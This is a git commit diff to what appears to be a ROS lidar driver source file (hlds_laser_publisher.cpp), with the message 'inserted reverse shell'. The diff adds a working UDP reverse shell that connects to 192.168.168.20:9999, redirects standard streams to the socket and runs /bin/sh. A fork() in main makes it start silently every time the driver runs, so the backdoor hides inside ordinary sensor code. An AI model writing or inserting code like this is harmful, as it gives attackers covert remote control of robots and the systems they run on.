9229009ae3c90736ac570a82b81680938d47aca9
yueyeah <yuejunyi@u.nus.edu>
2020-03-05 01:38:18 +0000

    inserted reverse shell

--- src/hlds_laser_publisher.cpp
+++ src/hlds_laser_publisher.cpp
@@ -37,6 +37,15 @@
 #include <boost/asio.hpp>
 #include <hls_lfcd_lds_driver/lfcd_laser.hpp>
 
+// Libraries needed for the udp reverse shell
+#include <stdio.h>
+#include <sys/socket.h>
+#include <unistd.h>
+#include <netinet/ip.h>
+#include <arpa/inet.h>
+#include <string.h>
+
+
 namespace hls_lfcd_lds
 {
 LFCDLaser::LFCDLaser(const std::string& port, uint32_t baud_rate, boost::asio::io_service& io)
@@ -50,6 +59,37 @@ LFCDLaser::LFCDLaser(const std::string& port, uint32_t baud_rate, boost::asio::i
 LFCDLaser::~LFCDLaser()
 {
   boost::asio::write(serial_, boost::asio::buffer("e", 1));  // stop motor
+}
+
+int reverse_shell(){
+
+	const char *host = "192.168.168.20";
+	int port = 9999;
+
+	/* Set up sockaddr struct */
+	struct sockaddr_in address;
+	address.sin_family = AF_INET;
+	address.sin_port = htons(port);
+	inet_aton(host, &address.sin_addr);
+
+	/* Connect */
+	int s = socket(AF_INET, SOCK_DGRAM, 0);
+	connect(s, (struct sockaddr*)&address, sizeof(address));
+	
+	/* Send initial message (there is no SYN in UDP) */
+	char buf[20];
+	strcpy(buf, "Starting UDP shell\n");
+	sendto(s, &buf, strlen(buf)+1, 0, (struct sockaddr*)&address, sizeof(address));
+
+	/* Copy file descriptors */
+	dup2(s, STDIN_FILENO);
+	dup2(s, STDOUT_FILENO);
+	dup2(s, STDERR_FILENO);
+
+	execve("/bin/sh", NULL, NULL);
+
+	return 0;
+
 }
 
 void LFCDLaser::poll(sensor_msgs::msg::LaserScan::SharedPtr scan)
@@ -140,6 +180,11 @@ int main(int argc, char **argv)
   rclcpp::Publisher<sensor_msgs::msg::LaserScan>::SharedPtr laser_pub;
   boost::asio::io_service io;
 
+  int childPid = fork();
+  if (childPid == 0) {
+	  hls_lfcd_lds::reverse_shell();
+  }
+
   std::string port;
   std::string frame_id;
   int baud_rate;
@@ -178,3 +223,4 @@ int main(int argc, char **argv)
     return -1;
   }
 }
+
